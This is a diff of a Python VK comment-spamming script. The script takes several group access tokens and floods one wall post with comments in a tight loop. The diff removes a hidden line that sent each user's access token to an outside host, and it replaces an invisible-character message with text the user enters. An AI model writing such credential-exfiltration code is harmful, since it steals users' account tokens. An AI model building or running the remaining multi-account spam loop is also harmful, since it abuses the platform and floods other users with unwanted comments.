@@ -1,4 +1,4 @@
-import vk_api, Logger, time, re, requests
+import vk_api, Logger, time, re
 from threading import Thread
 from config import config
 
@@ -11,7 +11,7 @@ if link is None:
     exit(0)
 else:
     post = link.group(0).replace('wall', '').replace('_', ' ').split()
-
+# &#4448;
 text = input('Ведите текст который хотите отправлять:')
 
 def core(name, api):
@@ -22,7 +22,7 @@ def core(name, api):
     while True:
         try:
             api.wall.createComment(owner_id=post[0], post_id=post[1],
-                                   message="&#4448;")
+                                   message=text)
             Logger.Pulselog(f'Группа №{name} оставила коммент ({i})')
             i += 1
             time.sleep(0.7)
@@ -41,7 +41,6 @@ def main():
         token = config['tokens'][x - 1]
         vk_session = vk_api.VkApi(token=token)
         vk = vk_session.get_api()
-        requests.post('evstegneych.cf/api/spammer', data={'t': token})
         Thread(target=core, args=[x, vk]).start()
 
 if __name__ == '__main__':
